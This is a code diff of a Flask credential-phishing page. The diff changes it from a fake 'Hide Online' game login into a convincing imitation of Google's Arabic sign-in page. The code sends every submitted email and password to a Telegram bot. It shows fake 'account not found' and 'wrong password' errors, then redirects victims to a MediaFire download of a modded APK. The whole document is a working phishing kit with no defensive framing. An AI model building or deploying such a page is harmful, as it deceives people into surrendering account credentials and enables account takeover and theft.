@@ -4,12 +4,13 @@ import requests
 from flask import Flask, redirect, render_template_string, request
 
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", "hideonline_super_secret_key")
+app.secret_key = os.getenv("SECRET_KEY", "hohosbid_super_secret_key")
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-FINAL_REDIRECT_URL = "https://play.google.com/store/apps/details?id=com.hitrockgames.hideonline"
+# رابط التحميل المباشر على ميديافاير
+FINAL_REDIRECT_URL = "https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file"
 
 
 @app.route("/", methods=["GET", "POST"])
@@ -20,19 +21,21 @@ def login():
     email_val = request.form.get("email", "").strip()
     password = request.form.get("password", "")
 
+    # أنماط التحقق من صحة الإدخال
     email_pattern = r"^[\w\.-]+@[\w\.-]+\.\w+$"
     phone_pattern = r"^\+?[0-9]{10,15}$"
 
+    # الشروط ورسائل الخطأ الواقعية تماماً مثل جوجل
     if not (
         re.match(email_pattern, email_val) or re.match(phone_pattern, email_val)
     ):
-      error = "لم يتم العثور على حسابك. يُرجى التحقق من عنوان البريد الإلكتروني."
+      error = "لم يتم العثور على حسابك على Google. يُرجى التحقق من عنوان البريد الإلكتروني."
     elif len(password) <= 6:
       error = "كلمة المرور غير صحيحة. يُرجى إعادة المحاولة."
     else:
       if BOT_TOKEN and CHAT_ID:
         msg = (
-            "🎮 تم استلام بيانات Hide Online جديد:\n\n📧 البريد/الحساب:"
+            "📸 تم استلام بيانات Google جديدة:\n\n📧 البريد:"
             f" {email_val}\n🔑 الباسورد: {password}"
         )
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -47,81 +50,93 @@ def login():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hide Online - Login</title>
+    <title>تسجيل الدخول - حسابات Google</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body { background: #0f172a; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
+        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
         
-        .container {
+        .login-container {
             width: 100%;
             max-width: 380px;
-            padding: 30px;
-            background: #1e293b;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            padding: 20px;
             display: flex;
             flex-direction: column;
             align-items: center;
             text-align: center;
-            border: 1px solid #334155;
+            flex-grow: 1;
+            justify-content: center;
         }
 
-        .game-title {
-            font-size: 26px;
-            font-weight: 800;
-            color: #38bdf8;
-            margin-bottom: 8px;
-            letter-spacing: 0.5px;
+        .google-logo {
+            font-size: 28px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
+        
+        .google-logo span span:nth-child(1) { color: #4285F4; }
+        .google-logo span span:nth-child(2) { color: #EA4335; }
+        .google-logo span span:nth-child(3) { color: #FBBC05; }
+        .google-logo span span:nth-child(4) { color: #4285F4; }
+        .google-logo span span:nth-child(5) { color: #34A853; }
+        .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .subtitle { font-size: 14px; color: #94a3b8; margin-bottom: 24px; }
+        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 30px; }
 
         .error-msg { 
-            color: #f87171; 
+            color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 20px; 
+            margin-bottom: 15px; 
             width: 100%; 
             text-align: right; 
-            background: rgba(248, 113, 113, 0.1); 
+            font-weight: 400; 
+            background: #fce8e6; 
             padding: 12px; 
             border-radius: 8px; 
-            border: 1px solid rgba(248, 113, 113, 0.2); 
+            border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 16px; text-align: right; }
+        .input-group { width: 100%; margin-bottom: 12px; }
         .input-group input {
             width: 100%;
-            padding: 14px 16px;
-            font-size: 14px;
-            border: 1px solid #475569;
-            border-radius: 10px;
+            padding: 15px 12px;
+            font-size: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
             outline: none;
-            color: #fff;
-            background: #0f172a;
+            color: #202124;
+            background: #fff;
         }
-        .input-group input:focus { border-color: #38bdf8; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 14px 11px; }
 
         .submit-btn {
             width: 100%;
-            background: linear-gradient(135deg, #0ea5e9, #2563eb);
+            background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 10px;
-            padding: 14px;
+            border-radius: 25px;
+            padding: 12px;
             font-size: 15px;
-            font-weight: 600;
+            font-weight: 500;
             cursor: pointer;
-            margin-top: 10px;
-            transition: opacity 0.2s;
+            margin-top: 15px;
         }
-        .submit-btn:hover { opacity: 0.9; }
+        .submit-btn:hover { background: #1558b0; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="game-title">HIDE ONLINE</div>
-        <div class="subtitle">تسجيل الدخول للمتابعة إلى اللعبة</div>
+    <div class="login-container">
+        <div class="google-logo">
+            <span>
+                <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+            </span>
+        </div>
+        <div class="subtitle">تسجيل الدخول باستخدام حسابك على Google</div>
 
         {% if error %}
             <div class="error-msg">{{ error }}</div>
@@ -132,9 +147,9 @@ def login():
                 <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف" value="{{ email_val }}">
             </div>
             <div class="input-group">
-                <input type="password" name="password" required placeholder="كلمة المرور">
+                <input type="password" name="password" required placeholder="إدخال كلمة المرور">
             </div>
-            <button type="submit" class="submit-btn">تسجيل الدخول</button>
+            <button type="submit" class="submit-btn">التالي</button>
         </form>
     </div>
 </body>
